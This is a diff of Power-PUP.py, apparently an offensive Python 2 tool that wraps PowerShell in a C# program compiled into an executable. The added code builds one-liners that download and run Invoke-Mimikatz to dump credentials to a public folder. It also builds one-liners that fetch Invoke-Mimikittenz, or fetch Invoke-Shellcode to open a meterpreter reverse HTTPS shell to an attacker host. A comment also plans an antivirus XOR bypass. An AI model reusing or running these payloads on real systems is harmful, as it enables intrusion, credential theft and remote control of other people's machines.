@@ -2,7 +2,6 @@
 #!/bin/python2                                                  #
 #-Metadata------------------------------------------------------#
 #  Filename: Power-PUP.py                                       #
-#  Version: 1.0                                                 #
 #  Release: 2016-07-26                                          #
 #                                                               #
 #-Info----------------------------------------------------------#
@@ -37,10 +36,7 @@
 #  - Detect .Net Version                                        #
 #       HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\                  #
 #       NET Framework Setup\NDP\v4\Full\InstallPath             #
-#  - Create options for common payloads                         #
-#       (mimi/invoke-shell/ps1)                                 #
 #  - A/V XOR bypass                                             #
-#  - Input a file containing ps commands (single or multiple)   #
 #                                                               #
 #---------------------------------------------------------------#
 
@@ -52,7 +48,7 @@ from sys import argv
 
 name = "Powershell Universal Programmer"
 shrtname = " (Power-PUP.py)"
-__version__ = "1.0"
+__version__ = "1.5"
 
 
 banner = '''
@@ -95,15 +91,68 @@ banner = '''
 
 '''
 
+def mimi_quick():
+    # invoke-mimicatz quick execute
+
+    location = raw_input("\nEnter Invoke-Mimikatz location (Ex. http://192.168.1.1/im.txt) : \n: ")
+    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Mimikatz -DumpCreds > c:\\Users\\Public\\katz.txt"
+
+    print '\nFile will be saved to: c:\\Users\\Public\\katz.txt\n'
+    write_csfile(ps_script)
+    
+def kitti_quick():
+    # invoke-mimicatz quick execute
+
+    location = raw_input("\nEnter Invoke-Mimikittenz location (Ex. http://192.168.1.1/im.txt) : \n: ")
+    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-mimikittenz > c:\\Users\\Public\\kitz.txt"
+
+    print '\nFile will be saved to: c:\\Users\\Public\\kitz.txt\n'
+    write_csfile(ps_script)
+    
+def shell_quick():
+    # invoke-shellcode quick execute
+
+    location = raw_input("\nEnter Invoke-Shellcode location (Ex. http://192.168.1.1/is.txt) : \n: ")
+    revhost = raw_input("\nEnter reverse host (Ex. 192.168.1.2) : \n: ")
+    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost " + revhost + " -Lport 443 -force"
+    print '''
+    \nSHELLCODE
+   PAYLOAD: windows/meterpreter/reverse_https
+   LHOST: ''' + revhost
+    print "   LPORT: 443\n\n"
+
+    write_csfile(ps_script)
+
+def enter_ps():
+    ps_input = raw_input("Enter the powershell commands to execute seperated by <ENTER>. \n: ")
+    command = '(' + ps_input + ')'
+
+    while (ps_input.strip()):
+        ps_input = raw_input(': ')
+        if ps_input != '':
+            command += ' -or (' + ps_input + ')'
+
+#    print command
+
+    #(calc.exe) -or ((sleep -s 10) -or (notepad.exe))
+    #ps_script = string.replace(command, '\\', '\\\\')
+    ps_script = command
+    print
+    
+    write_csfile(ps_script)
+    
 
 def write_csfile(ps_script):
-
     # Open and create cs file to compile
+
+    ps_script = string.replace(ps_script, '\\', '\\\\')
+
     with open('temp.cs', 'w') as f:
         f.write('using System;\nusing System.Collections.ObjectModel;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\n\nnamespace nps\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            PowerShell ps = PowerShell.Create();\n')
         f.write('            String script = "' + ps_script + '";\n')
         f.write('            ps.AddScript(script);\n            Collection<PSObject> output = null;\n            try\n            {\n                output = ps.Invoke();\n            }\n            catch(Exception e)\n            {\n                Console.WriteLine("Error while executing the script.\\r\\n" + e.Message.ToString());\n            }\n            if (output != null)\n            {\n                foreach (PSObject rtnItem in output)\n                {\n                    Console.WriteLine(rtnItem.ToString());\n                }\n            }\n        }                \n    }\n}\n')
         f.close
+    
     
 def compile_exe(arch,out_exe):
     # Compile the executable
@@ -115,6 +164,7 @@ def compile_exe(arch,out_exe):
 
     os.system('cmd.exe /c ' + dotnet_loc + 'csc.exe /unsafe /reference:"C:\\windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:' + out_exe + ' /platform:' + arch +' "temp.cs"')
 
+
 def usage():
     print "Usage: Power-PUP.py -a target_architecture"
     print "-a | --arch                - architecture of the target host"
@@ -125,6 +175,7 @@ def usage():
     print "Power-PUP.py -a x86"
     print "Power-PUP.py -a x64 -o psx64.exe"
     sys.exit(0)
+
 
 def main():
 
@@ -164,21 +215,32 @@ def main():
             else:
                 assert False,"Unhandled Option"
 
-    ps_input = raw_input("Enter the powershell commands to execute seperated by <ENTER>. \n: ")
-    command = '(' + ps_input + ')'
+    menu = {}
+    menu['1']=" Invoke-Mimikatz" 
+    menu['2']=" Invoke-Shellcode"
+    menu['3']=" Invoke-Mimikittenz" 
+    menu['4']=" Custom PowerShell Command"
+    menu['5']=" Exit"
+    options=menu.keys()
+    options.sort()
+    for entry in options: 
+        print entry, menu[entry]
 
-    while (ps_input.strip()):
-        ps_input = raw_input(': ')
-        if ps_input != '':
-            command += ' -or (' + ps_input + ')'
+    selection=raw_input("\nPlease Select:  ")
+    if selection =='1':
+        mimi_quick() 
+    elif selection == '2': 
+        shell_quick()
+    elif selection == '3': 
+        kitti_quick()
+    elif selection == '4':
+        enter_ps() 
+    elif selection == '5': 
+        sys.exit(0)
+    else: 
+        print "Unknown Option Selected!" 
 
-#    print command
-
-    #(calc.exe) -or ((sleep -s 10) -or (notepad.exe))
-    ps_script = string.replace(command, '\\', '\\\\')
-    print
-    
-    write_csfile(ps_script)
     compile_exe(arch,out_exe)
+    
     
 main()
